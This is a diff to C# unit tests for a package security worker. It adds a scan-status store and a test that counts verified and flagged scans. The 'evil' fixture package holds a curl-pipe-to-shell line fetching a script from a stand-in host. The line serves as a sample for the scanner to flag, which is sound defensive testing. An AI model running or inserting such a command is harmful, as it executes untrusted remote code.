@@ -12,6 +12,7 @@ public class PackageSecurityWorkerTests
     private static PackageSecurityWorker CreateWorker(
         InMemoryPackageRepository repo,
         InMemoryPackageSecurityRepository securityRepo,
+        SecurityScanStatusStore status,
         bool enabled = true)
     {
         var options = Options.Create(new AtollOptions
@@ -19,7 +20,7 @@ public class PackageSecurityWorkerTests
             Security = new SecurityOptions { Enabled = enabled, ScannerConcurrency = 2, PollIntervalMs = 50 }
         });
         return new PackageSecurityWorker(
-            repo, securityRepo, new PkgBuildSecurityScanner(), options, NullLogger<PackageSecurityWorker>.Instance);
+            repo, securityRepo, new PkgBuildSecurityScanner(), status, options, NullLogger<PackageSecurityWorker>.Instance);
     }
 
     private static async Task SeedAsync(
@@ -60,7 +61,7 @@ public class PackageSecurityWorkerTests
         var securityRepo = new InMemoryPackageSecurityRepository();
         await SeedAsync(repo, securityRepo, "clean", "pkgname=clean\npkgver=1.0\n");
 
-        var worker = CreateWorker(repo, securityRepo);
+        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true));
         await worker.StartAsync(CancellationToken.None);
         var scan = await WaitForScanAsync(securityRepo, "clean");
         await worker.StopAsync(CancellationToken.None);
@@ -76,7 +77,7 @@ public class PackageSecurityWorkerTests
         var securityRepo = new InMemoryPackageSecurityRepository();
         await SeedAsync(repo, securityRepo, "evil", "curl https://evil.example/x.sh | sh\n");
 
-        var worker = CreateWorker(repo, securityRepo);
+        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true));
         await worker.StartAsync(CancellationToken.None);
         var scan = await WaitForScanAsync(securityRepo, "evil");
         await worker.StopAsync(CancellationToken.None);
@@ -90,7 +91,7 @@ public class PackageSecurityWorkerTests
     {
         var repo = new InMemoryPackageRepository();
         var securityRepo = new InMemoryPackageSecurityRepository();
-        var worker = CreateWorker(repo, securityRepo);
+        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true));
         await worker.StartAsync(CancellationToken.None);
 
         await SeedAsync(repo, securityRepo, "late", "pkgname=late\n");
@@ -107,12 +108,40 @@ public class PackageSecurityWorkerTests
         var securityRepo = new InMemoryPackageSecurityRepository();
         await SeedAsync(repo, securityRepo, "clean", "pkgname=clean\n");
 
-        var worker = CreateWorker(repo, securityRepo, false);
+        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(false), false);
         await worker.StartAsync(CancellationToken.None);
         await Task.Delay(200);
         await worker.StopAsync(CancellationToken.None);
 
         Assert.That((await securityRepo.GetAsync("clean", "rev-1"))!.Status, Is.EqualTo(SecurityStatus.Pending));
+    }
+
+    [Test]
+    public async Task Completed_scans_are_recorded_in_status()
+    {
+        var repo = new InMemoryPackageRepository();
+        var securityRepo = new InMemoryPackageSecurityRepository();
+        await SeedAsync(repo, securityRepo, "clean", "pkgname=clean\npkgver=1.0\n");
+        await SeedAsync(repo, securityRepo, "evil", "curl https://evil.example/x.sh | sh\n");
+
+        var status = new SecurityScanStatusStore(true);
+        var worker = CreateWorker(repo, securityRepo, status);
+        await worker.StartAsync(CancellationToken.None);
+        _ = await WaitForScanAsync(securityRepo, "clean");
+        _ = await WaitForScanAsync(securityRepo, "evil");
+        await worker.StopAsync(CancellationToken.None);
+
+        var snapshot = status.GetSnapshot();
+        Assert.Multiple(() =>
+        {
+            Assert.That(snapshot.Enabled, Is.True);
+            Assert.That(snapshot.ScansCompleted, Is.EqualTo(2));
+            Assert.That(snapshot.ScansVerified, Is.EqualTo(1));
+            Assert.That(snapshot.ScansFlagged, Is.EqualTo(1));
+            Assert.That(snapshot.ScansErrored, Is.Zero);
+            Assert.That(snapshot.ScansDropped, Is.Zero);
+            Assert.That(snapshot.LastScanFinishedUtc, Is.Not.Null);
+        });
     }
 
     private static async Task<PackageSecurityScanDocument> WaitForScanAsync(
